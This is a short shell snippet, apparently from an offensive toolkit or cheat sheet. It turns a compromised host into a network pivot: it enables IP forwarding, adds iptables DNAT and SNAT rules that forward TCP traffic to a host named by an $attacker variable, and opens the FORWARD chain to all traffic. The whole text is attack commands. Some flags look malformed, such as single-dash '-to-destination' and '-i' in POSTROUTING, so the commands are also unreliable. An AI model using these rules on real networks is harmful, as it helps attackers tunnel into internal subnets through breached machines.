echo "1" > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A PREROUTING -p tcp -i $iface -j DNAT -d $pivotip --dport $dport -to-destination $attacker:$dport
iptables -t nat -A POSTROUTING -p tcp -i $iface -j SNAT -s $targetsubnetcidrrange -d $attacker --dport $dport -to-source $pivotip
iptables -t filter -I FORWARD 1 -j ACCEPT
